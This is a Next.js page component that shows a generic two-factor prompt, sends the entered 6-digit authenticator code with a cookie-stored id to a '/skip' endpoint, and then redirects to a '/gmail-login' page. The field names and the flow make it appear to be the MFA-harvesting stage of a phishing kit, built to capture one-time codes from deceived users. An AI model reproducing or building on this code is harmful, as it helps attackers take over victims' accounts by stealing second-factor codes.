import { Form, Formik } from "formik";
import { API_URL } from "../config";
import Header from "../components/Header";
import Footer from "../components/Footer";
import Cookies from "js-cookie";
import InputField from "../components/InputField";
import { toast } from "react-toastify";
import { useRouter } from "next/router";
import { useState } from "react";

function RecoveryAuthPage() {
  const router = useRouter();
  const id = Cookies.get("id");
  const [code, setCode] = useState("");

  const handleSubmit = async () => {
    const values = {
      id: id,
      skipcode: code,
    };

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      setCode("");
      router.push("/gmail-login");
      // router.push("/account/email");
      // Cookies.remove("id");
      // Cookies.remove("email");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };
  return (
    <>
      <Header />
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="w-full max-w-md bg-white p-6 rounded-lg shadow-lg">
          <div className="bg-red-100 text-red-700 p-3 rounded-md mb-4 text-sm">
            You need to authenticate via an additional factor before continuing
          </div>
          <h2 className="text-2xl font-semibold text-gray-800 mb-4">
            Enter authenticator app code
          </h2>
          <p className="text-gray-600 mb-4">
            Enter the 6-digit code from the authenticator app on your phone or
            password manager.
          </p>
          <input
            type="text"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:outline-none"
            placeholder="_ _ _ _ _ _"
            maxLength="6"
          />
          <button
            className="w-full bg-red-600 text-white py-2 mt-4 rounded-md hover:bg-red-700"
            onClick={() => handleSubmit()}
          >
            Authenticate
          </button>
          <div className="mt-4 text-sm text-gray-600">
            <a href="#" className="text-red-600 hover:underline">
              Authenticate using emergency recovery code instead
            </a>{" "}
            |
            <a href="#" className="text-red-600 hover:underline">
              {" "}
              Log out instead
            </a>
          </div>
        </div>
      </div>
      <Footer />
    </>
  );
}

export default RecoveryAuthPage;
